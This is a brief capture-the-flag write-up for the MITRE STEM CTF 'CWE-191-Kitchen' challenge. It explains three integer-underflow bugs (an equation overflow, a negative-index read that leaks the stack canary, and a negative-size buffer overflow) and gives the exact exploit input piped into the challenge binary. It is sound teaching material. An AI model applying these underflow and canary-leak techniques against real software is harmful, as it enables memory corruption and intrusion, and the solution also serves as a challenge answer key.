# Write-up for CWE-191-Kitchen MITRE STEM CTF Challenge

The challenge is a set of three CWE-191 vulnerabilities. 

Vulnerability 1: Simple overflow to solve a generally impossible equation.
Vulnerability 2: A read vulnerability by overflowing and reading a negative index of an array. There
exists a large number (the stack canary to be specific) there that the computer isn't expecting.
Vulnerability 3: A write vulnerability by providing a negative number, and then performing a
buffer overflow.

Run the command:
```
echo -ne '876982858 0 -9223372036854775808 -1 9223372036854775808 9223372036854775808 9223372036854775808 9223372036854775808 9223372036854775808 9223372036854775808 9223372036854775808 9223372036854775808 9223372036854775808 9223372036854775808 9223372036854775808 9223372036854775808 9223372036854775808 9223372036854775808 9223372036854775808 9223372036854775808 9223372036854775808' | ./cwe-191-kitchen-release
```
It may take a few times to get the correct random.

Or manually provide these for each vulnerability:
```
Vuln 1: 876982858
Vuln 2: 0 -9223372036854775808 (May take a few attempts to random correctly)
Vuln 3: sz: -1, and then 20 9223372036854775808s
```

